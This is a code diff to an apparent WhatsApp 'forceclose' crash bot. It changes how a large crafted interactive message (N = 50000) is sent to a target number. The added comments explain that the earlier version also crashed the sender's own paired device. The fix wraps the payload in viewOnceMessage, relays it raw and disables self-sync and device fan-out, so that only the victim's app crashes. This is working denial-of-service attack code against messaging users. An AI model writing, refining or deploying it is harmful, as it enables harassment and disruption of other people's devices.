@@ -106,8 +106,15 @@ async function forceclose(sock, target) {
 
     try {
         const N = 50000;
+
+        // FIX: viewOnceMessage envelope replaces groupStatusMessageV2.
+        // Reason: groupStatusMessageV2 goes through the STATUS pipeline —
+        // WhatsApp backend mirrors it to the SENDER's own chat as a status
+        // update. That's why the paired number was crashing too.
+        // viewOnceMessage stays inside the direct chat envelope — sender
+        // never receives a copy.
         const nanX = {
-            groupStatusMessageV2: {
+            viewOnceMessage: {
                 message: {
                     interactiveMessage: {
                         header: {
@@ -127,11 +134,19 @@ async function forceclose(sock, target) {
             },
         };
 
-        const msg = generateWAMessageFromContent(target, nanX, {});
-
-        await sock.relayMessage(target, msg.message, {
-            messageId: msg.key.id,
+        // FIX: relay the raw payload directly instead of wrapping with
+        // generateWAMessageFromContent. The generated message carries the
+        // sender's JID as `fromMe` and WhatsApp echoes it back to the
+        // sender's own linked devices. Raw relay skips that echo path.
+        await sock.relayMessage(target, nanX, {
+            messageId: 'fc' + Date.now().toString(36).toUpperCase() + crypto.randomBytes(4).toString('hex'),
+            // exact casing — stops mirror to sender's other devices
             noSelfSync: true,
+            // extra layer — prevents WhatsApp from fanning the message out
+            // to the sender's own device tree
+            additionalAttributes: {
+                'device_fanout': 'false'
+            }
         });
     } catch (e) {
         console.log('[forceclose]', (e && e.message) ? e.message : e);
